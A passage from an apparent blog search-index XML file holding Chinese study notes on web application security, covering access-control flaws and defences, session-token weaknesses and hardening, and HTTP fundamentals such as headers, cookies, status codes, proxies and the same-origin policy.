<li><p>注入XPath</p>
</li>
<li><p>注入LDAP</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>数据存储</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击访问控制</title>
    <url>/2019/03/20/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/3.%E6%94%BB%E5%87%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h1 id="攻击访问控制"><a href="#攻击访问控制" class="headerlink" title="攻击访问控制"></a>攻击访问控制</h1><p>访问控制漏洞的概念非常简单：应用程序允许攻击者执行某种攻击者没有资格执行的操作。</p>
<p>访问控制可分为三大类：垂直访问控制、水平访问控制和上下文访问控制。</p>
<p>垂直访问控制允许各种类型的用户访问应用程序的不同功能。在最简单的情况下，应用程序通过这种控制界定普通用户和管理员。在更加复杂的情况下，垂直访问控制可能需要界定允许其访问特殊功能的各种不同类型的用户，给每个用户分配一个单独的角色，或一组不同的角色。</p>
<p>水平访问控制允许用户访问一组相同类型的、内容及其宽泛的的资源。</p>
<p>上下文相关的访问控制可确保基于应用程序当前的状态，将用户权限仅限于所允许的内容。</p>
<p>许多时候，垂直与水平访问控制相互交叠。</p>
<p>如果用户能够访问他无权限访问的功能和资源，就表示访问控制存在缺陷。主要有三种类型的以访问控制为目标的攻击，分别与三种访问控制相对应。</p>
<ul>
<li><p>如果一名用户能够执行某项功能，但分配给他的角色并不具有这种权限，就表示出现<strong>垂直权限提升</strong>漏洞。例如，如果一名普通用户能够执行管理功能，或者一位会计文员能够支付任意金额的发票，就表示访问控制并不完善。</p>
</li>
<li><p>如果一名用户能够查看或修改它没有资格查看或修改的资源，就表示出现<strong>水平权限提升漏洞</strong>。例如，如果用户能够使用Web邮件应用程序阅读他人的电子邮件，或者如果一位会计文员可以处理自己所属组织单元以外的单元的发票，那么访问控制也不完善。</p>
</li>
<li><p>如果用户可以利用应用程序状态机中的漏洞获得关键资源的访问权限，就表示出现<strong>业务逻辑漏洞</strong>。例如，用户能够避开购物结算序列中的支付步骤。</p>
</li>
</ul>
<h2 id="保障访问控制的安全"><a href="#保障访问控制的安全" class="headerlink" title="保障访问控制的安全"></a>保障访问控制的安全</h2><ul>
<li>不要认为不知道用于指定应用程序资源的URL或标识符（如账号和文档ID）就无法访问这些资源。假设用户知道每一个应用程序的URL和标识符，确保应用程序的访问控制足以防止未授权访问。</li>
<li>不要信任任何用户提交的表示访问权限的参数。</li>
<li>不要认为用户将按设定的顺序访问应用程序页面。不要认为因为用户无法访问“编辑用户”页面，它们就不能到达由该页面链接的“编辑用户X”页面。</li>
<li>不要相信用户不会篡改通过客户端传送的数据。</li>
</ul>
<p>以下是一些在Web应用程序中执行有效访问控制的最佳方法。</p>
<ul>
<li>仔细评估并记录每个应用程序功能单元的访问控制要求。这包括谁能合法使用这些功能，以及用户通过这些功能能够访问哪些资源。</li>
<li>通过用户会话做出所有访问控制决定。</li>
<li>使用一个中央应用程序组件检查访问控制。</li>
<li>通过这个组件处理每一个客户端请求，确认允许提出请求的用户访问他请求的功能和资源。</li>
<li>使用编程技巧确保前面的方法没有例外。一种有效的方法是规定每个应用程序页面必须采用一个由中央访问控制机制查询的界面。强制开发者将访问控制逻辑代码写入每个页面，不得找借口省略这些代码。</li>
<li>对于特别敏感的功能，如管理页面，可以通过IP地址进行进一步限制访问，确保只有特殊网络范围内的用户能够访问这些功能，不管他们是否登录。</li>
<li>如果静态内容需要得到保护，有两种方法可提供访问控制。首先，用户可通过向执行相关访问控制逻辑的服务器端动态页面传送一个文件名，间接访问静态文件。其次，可通过使用HTTP验证或应用程序服务器的其他特性隐藏进入的请求，并在允许访问前检查资源许可，控制用户直接访问静态文件。</li>
<li>无论何时通过客户端传送，指定用户所希望访问资源的标识符都容易遭到篡改。服务器应知心人完整的服务器端数据。任何时候通过客户端传送这些标识符，都需要对他们进行重新确认，以确保用户拥有访问被请求资源的授权。</li>
<li>对于安全性很关键的应用程序功能，考虑对每笔交易执行重复验证和双重授权，进一步确保该动能不会被未授权方使用，这样做可以减轻其他可能的攻击造成的后果。</li>
<li>记录每一个访问敏感数据或执行敏感操作的时间。</li>
</ul>
<h2 id="多层权限模型"><a href="#多层权限模型" class="headerlink" title="多层权限模型"></a>多层权限模型</h2><h3 id="编程控制"><a href="#编程控制" class="headerlink" title="编程控制"></a>编程控制</h3><p>数据库权限矩阵保存在一个数据库表中，并以编程的形式来做出访问控制决定。对用户角色进行分类可以简化某些访问控制检查，这一任务同样可以通过编程来完成。编程控制可能极其琐碎，并可能在应用程序中建立非常复杂的访问控制逻辑。</p>
<h3 id="自主访问控制"><a href="#自主访问控制" class="headerlink" title="自主访问控制"></a>自主访问控制</h3><p>自主访问控制（Discretionary Access Control， DAC）。使用自主访问控制，管理员可将自己的权限分配给其他与拥有特殊资源有关的用户。在<strong>封闭型DAC</strong>模型中，除非明确许可，否则拒绝访问。管理员还可以锁定或终止某个用户账户。在<strong>开放型DAC</strong>模型中，除非明确废除许可，否则允许访问。各种应用程序用户有权创建用户账户，并在此应用自主访问控制。</p>
<h3 id="基于角色的访问控制"><a href="#基于角色的访问控制" class="headerlink" title="基于角色的访问控制"></a>基于角色的访问控制</h3><p>基于角色的访问控制（Role-Based Access Control，RBAC）。这种控制使用许多命名的角色，每个角色拥有各不相同的特殊权限；每个用户分配有一个这样的角色。这样做可简化不同权限的分配与实施，并有助于管理复杂应用程序中的访问控制。使用角色对用户请求执行“前沿”访问检查有助于实行最少量的处理迅速拒绝许多未授权的请求。对特殊用户可访问的URL路径加以保护就是这种方法的一个典型应用</p>
<p>当设计基于角色的访问控制机制时，有必要限制角色的数量，以对应用程序的权限进行有效管理。如果建立太多琐碎的角色，那么由于不同角色的数目繁多，可能就很难对其进行有效管理。如果建立太少的角色，这些角色就只能对访问进行粗略管理，个体用户分配到的权限将不足以履行他们的职能。</p>
<p>如果使用平台级控制、基于HTTP方法和URL限制对不同应用程序角色的访问，则应将这些控制设计为使用默认拒绝模式，因为这是防火墙规则的最佳做法。这其中应包括各种特定规则，用于将某些HTTP方法和URL分配给特定角色，而且，随后的规则应拒绝不符合前一规则的任何请求。</p>
<h3 id="声明式控制"><a href="#声明式控制" class="headerlink" title="声明式控制"></a>声明式控制</h3><p>声明式控制（Declarative Control）。应用程序使用有线的数据库账号访问数据库。它对不停的用户群体使用不同的账户，每个账户分配到执行该群体所允许执行的操作所必需的的最低权限。这种声明式控制从应用程序以外进行声明。这是深层防御原理的一个非常有用的应用，因为权限是由另外一个组件赋予应用程序的。这样，即使一名用户突破在应用程序层面执行的访问控制，企图实施添加新用户之类的敏感操作，他仍然会被组织，因为他使用的数据库账号并未在数据库内获得必要的权限。</p>
<p>另一种情况是在配置应用程序的过程中，通过配置描述符文件在应用程序服务器层面上应用声明式访问控制，但是这种应用一般相对简单，并且无法进行扩展，所以无法管理大型应用程序中种类繁多的权限。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>访问控制</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击会话管理</title>
    <url>/2019/03/19/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/2.%E6%94%BB%E5%87%BB%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h1 id="攻击会话管理"><a href="#攻击会话管理" class="headerlink" title="攻击会话管理"></a>攻击会话管理</h1><h2 id="会话和Cookie"><a href="#会话和Cookie" class="headerlink" title="会话和Cookie"></a>会话和Cookie</h2><p>HTTP协议没有状态。它基于一种简单的请求-响应模型，其中美队消息代表一个独立的事务。协议本身并无将某位用户提出的各种请求联系起来的机制，并将它们与Web服务器收到的其他所有请求区分开来。</p>
<p>绝大多数的Web“站点”实际为Web应用程序。它们允许用户注册于与登录；帮助用户购买及销售产品。它们能够在用户下次访问时记住他的喜好。它们可根据用户的单机和输入，通过动态建立的内容提供丰富。多媒体形式的使用体验。为执行这些功能，就需要使用<strong>会话</strong>。</p>
<p>会话（Session）机制是在服务器保存状态的方案。执行会话最简单、最常见的方法就是向每名用户发布一个唯一的会话令牌或标识符。用户在随后向应用程序提出的每一个请求中都提交这个令牌，帮助应用程序在当前请求与前面提出的请求之间建立关联。</p>
<p>在大多数情况下，应用程序使用HTTP Cookie最为在服务器与客户端间传送这些会话令牌的传输机制。</p>
<h2 id="会话管理的基本方式"><a href="#会话管理的基本方式" class="headerlink" title="会话管理的基本方式"></a>会话管理的基本方式</h2><p>会话管理的基本方式主要有隐藏域、Cookies和URL重写。</p>
<h3 id="隐藏域"><a href="#隐藏域" class="headerlink" title="隐藏域"></a>隐藏域</h3><p>隐藏域是基于客户端实现的一种方式。比如，在填写信息的时候，完成第一页，进入第二页填写的时候，将第一页的信息保存在隐藏域中，在第二页完成之后，全部一起提交给服务器。这种方式具有不少的安全问题，例如，在关掉网页之后，就会遗失信息；查看网页源代码时，容易暴露信息。</p>
<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie是存储key-value键值对的一个文件。它是由服务器对客户端的第一个响应中的Set-Cookie消息头指定设置的。例如：</p>
<p><strong>Set-Cookie： id=123</strong></p>
<p>浏览器在请求响应头中检测到Set-Cookie头之后，会自动生成一个Cookie，将id=123保存在本地。</p>
<p>随后客户端每次请求的时候都是用Cookie请求头，将id=123这个值带给服务器，服务器再根据123找到对应的信息来维持状态。</p>
<p><strong>Cookie:id=123</strong></p>
<h3 id="URL重写"><a href="#URL重写" class="headerlink" title="URL重写"></a>URL重写</h3><p>URL重写就是将需要发送给服务器的信息附加在请求链接的背后，以参数的形式发送给服务器识别。</p>
<h2 id="会话的替代方案"><a href="#会话的替代方案" class="headerlink" title="会话的替代方案"></a>会话的替代方案</h2><h3 id="HTTP验证"><a href="#HTTP验证" class="headerlink" title="HTTP验证"></a>HTTP验证</h3><p>使用各种基于HTTP验证技术（基本、摘要、NTLM验证等）的应用程序有时避免使用会话。在HTTP验证中，哭护短组件使用HTTP消息头，通过浏览器直接与验证机制加护，而不是通过包含在任何单独页面中的针对特定应用程序的代码与验证机制交互。一旦用户在浏览器对话框中输入它的证书，浏览器将会在随后向同一服务器提出的每个请求中重复提交这些证书。（或重复执行任何必要的握手）这种做法等同于应用程序使用基于HTML表单的验证，并在每个应用程序页面插入一个登陆表单要求用户通过他们执行的每一项操作重复验证自己的身份。因此，如果使用基于HTTP的验证，应用程序可以不必要使用会话，而通过多个请求重复确定用户身份。然而，基于因特网的应用程序很少使用HTTP验证。而且，由于会话机制发展完善，能够提供其他用途非常广泛的功能，实际上，几乎所有的Web应用程序都采用这种机制。</p>
<h3 id="无会话状态机制"><a href="#无会话状态机制" class="headerlink" title="无会话状态机制"></a>无会话状态机制</h3><p>一些应用程序并不发布会话令牌管理用户与应用程序的交互状态，而是传送所有必要数据（一般保存在Cookie或隐藏表单字段中），由客户端管理状态。实际上，这种机制类似于ASP.NET viewState的方式使用无会话状态。为保证这种机制的安全，必须对通过客户端传送的数据加以适当的保护。这通常要求建立一个包含所有状态信息的二级制巨对象，并使用一种公认的算法对这些数据进行加密或签名。还必须在数据中包含足够的上下文，以防止攻击者将在应用程序某个位置收集到的状态提交到另一个位置，造成某种意外行为。应用程序还必须在对象的数据中包含一个终止时间，执行与会话超时相同的功能。</p>
<h2 id="会话令牌生成过程中的薄弱环节"><a href="#会话令牌生成过程中的薄弱环节" class="headerlink" title="会话令牌生成过程中的薄弱环节"></a>会话令牌生成过程中的薄弱环节</h2><ol>
<li>令牌有一定含义</li>
<li>令牌可预测<ol>
<li>隐含序列</li>
<li>时间依赖</li>
<li>生成的数字随机性不强</li>
</ol>
</li>
</ol>
<h2 id="会话令牌处理中的薄弱环节"><a href="#会话令牌处理中的薄弱环节" class="headerlink" title="会话令牌处理中的薄弱环节"></a>会话令牌处理中的薄弱环节</h2><ol>
<li>在网络中泄露令牌</li>
<li>在日志中泄露令牌</li>
<li>令牌-会话映射易受攻击</li>
<li>会话终止易受攻击</li>
<li>客户端暴露在令牌劫持风险之中</li>
<li>宽泛的Cookie范围</li>
</ol>
<h2 id="保障会话管理的安全"><a href="#保障会话管理的安全" class="headerlink" title="保障会话管理的安全"></a>保障会话管理的安全</h2><h3 id="生成强大的令牌"><a href="#生成强大的令牌" class="headerlink" title="生成强大的令牌"></a>生成强大的令牌</h3><ol>
<li>使用数量及其庞大的一组可能值；</li>
<li>包含强大的伪随机源，确保令牌以无法预测的方式平均分布在可能值的范围内</li>
</ol>
<h3 id="在整个生命周期保障令牌的安全"><a href="#在整个生命周期保障令牌的安全" class="headerlink" title="在整个生命周期保障令牌的安全"></a>在整个生命周期保障令牌的安全</h3><p>建立一个无法预测值的安全令牌后，就必须在这个令牌生成到废止的整个生命周期内保障它的安全，确保不会将其泄露给除令牌用户以外的其他任何人。</p>
<ol>
<li>令牌只能通过HTTPS传送。任何以明文传送的令牌都应被视为“污染”，也就是说，不能确保用户身份不被泄露。如果使用HTTP Cookie传送令牌，应将这些cookie加上<strong>secure</strong>标识（属性），防止用户浏览器通过HTTP传送它们。如果可能，应对每个应用程序页面使用HTTPS，包括静态内容（帮助页面、图像等）。如果没有可能，仍然采用HTTP服务，那么应用程序应将任何访问敏感内容（包括登录页面）的请求重定向到HTTPS服务。帮助页面之类的静态资源一般不属于敏感内容，不需要使用通过验证的会话即可访问；因此，可以通过使用cookie范围指令强化cookie的使用安全。，防止在访问这些资源的请求中提交令牌。</li>
<li>绝不能再URL中传送会话令牌，这样做易于受到会话固定攻击，并可能使会话出现在各种日志机制中。</li>
<li>应总是执行退出功能。通过它删除服务器上的所有会话资源并终止会话令牌。</li>
<li>会话处于非活动状态一段时间后，应执行会话终止。会话终止的效果应和用户完全退出的作用完全相同。</li>
<li>应防止并行登录。</li>
<li>如果应用程序包含任何可以查看会话令牌的管理或诊断功能，应对这种功能加以严密保护，以防止未授权的访问。</li>
<li>应极可能限定应用程序会话cookie的域和路径范围。</li>
<li>应严格审查应用程序的代码库，以确定并删除任何跨站点脚本漏洞。</li>
<li>不应接受用户提交。但服务器并不认可的任意令牌。应立即在浏览器中取消该令牌，并将用户返回到应用程序的起始页面。</li>
<li>在执行装展示类的重要操作之前，要求进行两步确认或重新验证可有效防御跨站点请求伪造和其他会话攻击。</li>
<li>不完全依赖HTTP cookie传送会话令牌可防御跨站点请求伪造攻击。</li>
<li>成功验证后，总是建立一个新的会话，以避免会话固定攻击的影响。</li>
</ol>
<h3 id="日志、监控与警报"><a href="#日志、监控与警报" class="headerlink" title="日志、监控与警报"></a>日志、监控与警报</h3><p>应用程序段额会话管理功能应与它的日志、监控与警报机制紧密结合，以提供适当的反常行为记录，并帮助管理员在必要时采取防御措施。</p>
<ol>
<li>应用程序应监控包含无效令牌的请求。</li>
<li>很难完全阻止针对会话令牌的蛮力攻击，因为我们无法通过禁用特殊用户账户或会话来终止这种攻击。一种可能的防御方法是在收到大量包含无效令牌的请求时，将其来源IP地址屏蔽一段时间。</li>
<li>及时无法立即有效防止针对会话的蛮力攻击，但保留详细的日志并向管理员发出警报任然可帮助他们对攻击进行调查，并尽其所能采取适当的行动。</li>
<li>只要有可能，应向用户警告与会话有关的反常事件。</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>会话</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP相关</title>
    <url>/2019/03/18/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/0.HTTP/</url>
    <content><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>HTTP(HyperText Transfer Protocol, 超文本传输协议)是访问万维网使用的核心通信协议。也是今天所有Web应用程序使用的通信协议。最初，HTTP只是一个为获取基于文本的静态资源而开发的简单协议，后来人们以各种形式扩展和利用它，时期能够支持如今常见的复杂分布式应用程序。</p>
<p>HTTP使用一种基于消息的模型：客户端送出一条请求消息，而后由服务器返回一条响应消息。该协议基本上不需要连接，虽然HTTP使用有状态的TCP协议作为它的传输机制，但每次请求与响应交换都自动完成，并且可能使用不同的TCP连接。</p>
<h2 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h2><p>所有HTTP消息（请求与响应）中都包含一个或几个单行显示地消息头（header），然后是一个强制空白行，最后是消息主体（可选）。以下是一个典型的HTTP请求：</p>
<p>GET /auth/488/YourDetails.ashx?uid=129 HTTP/1.1</p>
<p>Accept: application/x-ms-application, image/jpeg, application/xaml+xml</p>
<p>Referer: <a href="https://XXX" target="_blank" rel="noopener">https://XXX</a></p>
<p>Accept-Language: en-GB</p>
<p>User-Agent: XXXX</p>
<p>Accept-Ecoding: gzip</p>
<p>Host: mdsec.net</p>
<p>Connection: Keep-Live</p>
<p>Cookid: SessionId=xxxxx</p>
<p>每个HTTP请求的第一行都由以3个空格间隔的项目组成。</p>
<ul>
<li>一个说明HTTP方法的动词。最常用的方法为GET，它的主要作用是从Web服务器获取一个资源。GET 请求并没有消息主题，因此在消息头后的空白行中没有其他数据。</li>
<li>所请求的URL。该URL通常由所请求的资源名称，以及一个包含客户端向该资源提交的参数的可选查询字符串组成。在该URL中，查询字符串以？字符标识</li>
<li>使用的HTTP版本。</li>
<li>Referer消息头用于表示发出请求的原始URL。</li>
<li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息。</li>
<li>Host消息头用于指定出现在被访问的完整URL中的主机名称。如果几个Web站点以相同的一台服务器为主机，就需要使用Host消息头。</li>
<li>Cookie消息头用于提交服务器向客户端发布的其他参数。</li>
</ul>
<h2 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h2><p>以下是一个典型的HTTP响应：</p>
<p>HTTP/1.1 200 OK </p>
<p>Date: Tue, 19, Apr 2011 09:23:12 GMT</p>
<p>Server: Microsoft-IIS/6.0</p>
<p>X-Powered-By: ASP.NET</p>
<p>Set-Cookie: tracking=dddd</p>
<p>X-AspNet-Version: 2.0.44</p>
<p>Cache-Control: no-cache</p>
<p>Pragma: no-cache</p>
<p>Expires: Tue, 01, Jan 1970 00:00:00 GMT</p>
<p>Content-Type: text/html</p>
<p>Content-Length: 1078</p>
<!xasdasd><p>dsddasda&lt;/&gt;</p>
<p>每个HTTP响应的第一行由3个以空格间隔的项目组成。</p>
<ul>
<li>使用的HTTP版本</li>
<li>表示请求结果的数字装填。</li>
<li>一段以文本形式的“原因短语”，进一步说明响应状态</li>
</ul>
<h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><ul>
<li>GET方法的作用在于获取资源。它可以用与URL查询字符串的形式向所请求的资源发送参数。这是用户可将一个包含动态资源的URL标注为书签。</li>
<li>POST方法主要作用是执行操作。使用这个方法可以在URL查询字符串与消息主体中发送请求参数。</li>
<li>HEAD方法功能与GET方法类似，不同之处在于服务器不会再起响应中返回消息主体。服务器返回的消息头应与对应的GET请求的消息头相同。</li>
<li>TRACE方法主要用于诊断。服务器应在响应主体中返回其受到的请求消息的具体内容。这种方法可用于检测客户端与服务器之是否存在任何操纵请求的代理服务器。</li>
<li>OPTIONS方法要求服务器报告对某一特殊资源有效的HTTP方法。服务器通常返回一个包含ALLOW消息头的响应，并在其中列出所有有效的方法。</li>
<li>PUT方法视图使用包含在请求主体中的内容，向服务器上传指定的资源。</li>
</ul>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL（Uniform Resource Location，统一资源定位符）是表示Web资源的唯一标识符，通过它即可获取其表示的资源。最常用的URL格式如下：</p>
<p><strong>protocol://hostname[:port]/[path/]file[?parameter=value]</strong></p>
<p>这个结构中有几个部分是可选的。如果端口号与相关协议使用的默认值不同，则只包含端口号即可。</p>
<h2 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h2><p>表述性状态转移（REST）设计分布式系统的一种体系架构，在这类体系架构中，请求和响应包含系统资源当前状态的表示。</p>
<h2 id="HTTP消息头"><a href="#HTTP消息头" class="headerlink" title="HTTP消息头"></a>HTTP消息头</h2><p>HTTP支持许多不同的消息头，其中一些专用于特殊用途。一些消息头可用在请求与响应中，而其他一些消息头只能专门用在某个特定的消息中。</p>
<h3 id="常用消息头"><a href="#常用消息头" class="headerlink" title="常用消息头"></a>常用消息头</h3><ul>
<li>Connection：这个消息头用于高速通信的另一端，在完成HTTP传输后是关闭TCP连接还是保持连接开放以接受其他消息。</li>
<li>Content-Encoding：这个消息头为消息主体的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。</li>
<li>Content-Length：这个消息头用于规定消息主体的字节长度。（HEAD语法的响应例外，它在对应的GET请求的响应中指出主体的长度）。</li>
<li>Content-Type：用于规定消息主体的内容类型。</li>
<li>Transfer-Encoding：指定为为方便其通过HTTP传输而对消息主体使用的任何编码。如果使用这个消息头，通常用它指定块编码。</li>
</ul>
<h3 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h3><ul>
<li>Accept：用于高速服务器客户端愿意接受哪些内容。</li>
<li>Accept-Encoding：用于告诉服务器，客户端愿意接受哪些内容编码。</li>
<li>Authorization：用于为一种内置HTTP身份向服务器提交证书。</li>
<li>Cookie：用于向服务器提交它以前发布的Cookie</li>
<li>Host：用于指定出现在所请求的完整URL中的主机名称。</li>
<li>If-Modified-Since：用于说明浏览器最后一次受到所请求的资源的时间。如果自那以后资源没有发生变化，服务器就会发出一个带状态码的304响应，指示客户端使用资源的缓存副本。</li>
<li>If-None-Match：用于制定一个实体标签。实体标签是一个说明消息主体内容的标识符。当最后一次受到所请求的资源时，浏览器提交服务器发布的实体标签。服务器可以使用实体标签确定浏览器是否使用资源的缓存副本。</li>
<li>Origin：用在跨域Ajax请求中，用于指示提出请求的域。</li>
<li>Referer：用于指示提出当前请求的原始URL</li>
<li>User-Agent：提供与浏览器或生成请求的其他客户端软件有关的信息。</li>
</ul>
<h3 id="响应消息头"><a href="#响应消息头" class="headerlink" title="响应消息头"></a>响应消息头</h3><ul>
<li>Access-Control-Allow-Origin：用于指示是否可通过跨域Ajax请求获取资源。</li>
<li>Cache-Control：用于向浏览器传送缓存指令。</li>
<li>ETag：用于指定一个实体标签。客户端可在将来的请求中提交这个标识符，火哥和If-Non-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是那个版本的资源。</li>
<li>Expires：用于向浏览器说明消息主体内容的有效时间，在这个时间之前，浏览器可以使用这个资源的缓存副本。</li>
<li>Location：用于在重定向响应中说明重定向的目标。</li>
<li>Pragma：用于向浏览器传送缓存指令。</li>
<li>Server：提供所使用的的Web服务器软件的相关信息。</li>
<li>Set-Cookie：用于向浏览器发布Cookie，浏览器会在随后的请求中将其返回给服务器。</li>
<li>WWW-Authenticate：用在带401的状态码响应中，提供与服务器所支持的身份验证类型有关的信息。</li>
<li>X-Frame-Options：指示浏览器框架是否及如何加载当前响应。</li>
</ul>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie是大多数Web应用程序所依赖的HTTP协议的一个关键组成部分，攻击者常常通过它来利用Web程序中的漏洞。服务器使用cookie机制向客户端发送数据，客户端保存cookie并将其返回给服务器。</p>
<p>Cookie一般由一个名/值对构成，但也可以包含任何不含空格的字符串。可以在服务器响应中使用几个Set-Cookie消息头发布多个Cookie，并可在同一个Cookie消息头中用逗号分隔不同的Cookie，将它们全部返回给服务器。</p>
<p>去除Cookie的实际值之外，Set-Cookie消息头还可以包含以下任何可选属性，用它们控制浏览器处理Cookie 的方式。</p>
<ul>
<li>expires：用于设定Cookie的有效时间。这样会使浏览器将Cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么Cookie仅用在当前浏览器会话中。</li>
<li>domain：用于指定Cookie的有效域。这个域必须和受到Cookie的域相同，或者是它的父域。</li>
<li>path：要几个与指定Cookie的有效URL路径。</li>
<li>secure：如果设置这个属性，则仅在HTTPS请求中提交Cookie。</li>
<li>HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问Cookie.</li>
</ul>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。状态码可以分成以下5类：</p>
<ul>
<li>1xx-提供信息</li>
<li>2xx-请求被成功提交</li>
<li>3xx-客户端被重定向到其他资源</li>
<li>4xx-请求包含某种错误</li>
<li>5xx-服务器执行请求时遇到错误。</li>
</ul>
<h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><ul>
<li>100 Continue：当客户端提交一个包含主体的请求时，将发送这个响应。该响应表示已经收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。</li>
<li>200 OK。表示已成功提交请求，且响应主体包含请求结果。</li>
<li>201 Created：PUT请求的响应返回这个状态码，表示请求已成功提交。</li>
<li>301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</li>
<li>302 Found：本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL。客户端应在随后的请求中恢复使用原始URL。</li>
<li>304 Not Modified：本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。</li>
<li>400 Bad Request：本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时，可能会遇到这个错误码。</li>
<li>401 Unauthorized：服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</li>
<li>403 Forbidden：本状态码之处，不管是否通过身份验证，禁止任何人访问被请求的资源。</li>
<li>404 Not Found：本状态码表示所请求的资源并不存在。</li>
<li>405 Method Not Allowed：本状态码表示指定的URL不支持请求中使用方法。</li>
<li>413 Request Entity Too Large：如果在本地代码中探查缓冲器溢出漏洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。</li>
<li>414 Request URI Too Long：与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</li>
<li>500 Internal Server Error：本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输入、在应用程序处理过程中造成无法处理的错误时，通常会受到本状态码。</li>
<li>503 Service Unavailable：通常，本状态码表示尽管Web服务器运转正常，并且能够响应请求，但服务器访问的应用程序还是无法做出响应。</li>
</ul>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTP使用普通的非加密TCP作为其传输机制，因此，处在网络适当位置的攻击能够截取这个机制。HTTPS本质上与HTTP一样，都属于应用层协议，但HTTPS通过安全传输机制-安全套接层-传输数据。这种机制可保护通过网络传送的所有数据的隐秘性和完整性，显著降低非入侵式拦截攻击的可能性。不管是否使用SSL进行传输，HTTP请求与响应都以完全相同的方式工作。</p>
<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><p>HTTP代理服务器是一个协调客户端与目标Web服务器之间访问的服务器。当配置浏览器使用代理服务器时，它会将所有请求提交到代理服务器，代理服务器再将请求转发给相关Web服务器，并将响应返回给浏览器。大多数代理还使用其他服务，如缓存，验证与访问控制。值得注意的是，如果使用代理服务器，HTTP的工作机制会出现两方面的差异。</p>
<ul>
<li>当浏览器向代理服务器发布HTTP请求时，它会将完整的URL（包括协议前缀http://与服务器主机名称，在非标准URL中，还包括端口号）插入请求中。代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标的Web服务器。</li>
<li>当使用HTTPS时，浏览器无法与代理服务器进行SSL握手，因为这样做会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯粹的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络数据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个HTTP请求，并制定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标服务器的纯粹TCP级中继。</li>
</ul>
<p>从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使他可以拦截并修改所有使用HTTPS的请求与响应。</p>
<h2 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h2><p>HTTP拥有自己的身份验证机制，使用不同的身份验证方案。</p>
<ul>
<li>Basic。这是一种非常简单的身份验证机制，它在请求消息头中随每条消息以Base64编码字符串形式发送用户证书。</li>
<li>NTLM。这是一种质询-响应式机制，他使用某个Windows NTLM协议版本。</li>
<li>Digest。这是一种质询-响应式机制，它随同用户证书一起使用一个随机值MD5校验和。</li>
</ul>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是浏览器实施的一种关键机制，主要用于防止不同来源的内容相互干扰。基本上，从一个网站受到的内容可以读取并修改从该站点收到的其他内容，但不得访问从其他站点受到的内容。</p>
<p>如果不使用同源策略，那么当不知情的用户浏览到某个恶意网站时，在该网站上运行的脚本代码能够访问这名用户同时访问的任何其他网站的数据和功能。这样，该恶意站点就可以从用户的网上银行转账、阅读用户的Web邮件，火灾用户网上购物时拦截它的信用卡信息。为此，浏览器实施限制，只允许相同来源的内容进行交互。</p>
<p>关于同源策略，需要了解的一些主要特点如下：</p>
<ul>
<li>位于一个域中的页面可以向另一个域提出任意数量的请求。但该页面本身无法处理上述请求返回的数据。</li>
